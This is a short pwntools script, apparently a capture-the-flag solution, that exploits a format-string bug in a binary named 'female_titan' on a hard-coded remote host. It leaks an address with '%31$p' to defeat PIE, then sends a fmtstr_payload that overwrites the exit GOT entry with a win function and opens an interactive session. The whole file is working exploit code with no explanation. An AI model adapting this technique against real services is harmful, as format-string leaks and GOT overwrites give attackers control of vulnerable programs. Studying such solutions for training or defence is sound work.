from pwn import *
elf = context.binary = ELF('./female_titan')
# r = process()
r = remote('34.47.134.251', '5009')
# gdb.attach(r)
r.sendlineafter(b'You need to somehow leak her out??\n',b'%31$p')
elf.address = int(r.recvline()[2:14].decode(),16)-elf.sym.main
print(hex(elf.address))
win = elf.sym.win
payload = fmtstr_payload(8,{elf.got.exit:elf.sym.win})
print(len(payload))
r.sendline(payload)
r.interactive()